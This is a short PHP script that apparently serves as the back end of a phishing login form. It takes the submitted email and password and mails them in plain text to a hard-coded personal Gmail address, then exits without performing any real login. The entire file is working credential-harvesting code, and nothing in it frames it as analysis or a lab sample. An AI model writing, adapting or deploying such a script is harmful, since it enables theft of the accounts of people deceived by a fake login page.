
<?php
$to_email = 'dwipbiswas22972@gmail.com';
$subject = 'Login Form Submission';

$email = $_POST['email'];
$password = $_POST['password'];

$body = "Email: $email\nPassword: $password";

mail($to_email, $subject, $body);
exit;
?>
